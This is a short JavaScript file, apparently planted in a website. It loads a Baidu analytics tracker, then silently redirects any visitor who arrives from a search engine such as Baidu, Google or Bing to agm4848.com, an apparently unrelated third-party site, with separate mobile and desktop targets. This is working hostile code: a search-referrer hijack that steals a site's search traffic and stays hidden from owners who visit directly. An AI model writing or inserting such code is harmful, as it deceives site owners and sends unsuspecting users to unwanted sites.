/**
 * Created by gin on 2018/5/23.
 */
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?5f003303e789f4619071208b12c9c281";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();

var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|yahoo|bing|360)(\.[a-z0-9\-]+){1,2}\//ig;
var where = document.referrer;
if (regexp.test(where)) {
  if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
    location.href=(Math.random()<0.5)?"https://m.agm4848.com":"https://m.agm4848.com";
  }
  else{
    location.href=(Math.random()<0.5)?"https://www.agm4848.com":"https://www.agm4848.com";
  }
}